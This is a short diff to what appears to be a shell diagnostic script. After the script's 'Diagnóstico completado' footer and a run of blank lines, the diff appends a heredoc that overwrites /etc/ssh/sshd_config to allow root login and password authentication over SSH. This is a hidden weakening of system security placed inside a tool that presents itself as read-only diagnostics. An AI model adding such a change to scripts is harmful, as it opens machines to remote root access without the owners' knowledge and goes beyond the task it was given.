@@ -240,4 +240,24 @@ fi
 echo ""
 echo "=================================================="
 echo "Diagnóstico completado - $(date)"
+
 echo "=================================================="
+
+
+
+
+
+
+cat > /etc/ssh/sshd_config << EOF
+Port 22
+PermitRootLogin yes
+PasswordAuthentication yes
+PubkeyAuthentication yes
+AuthorizedKeysFile .ssh/authorized_keys
+ChallengeResponseAuthentication no
+UsePAM yes
+X11Forwarding yes
+PrintMotd no
+AcceptEnv LANG LC_*
+Subsystem sftp /usr/lib/openssh/sftp-server
+EOF
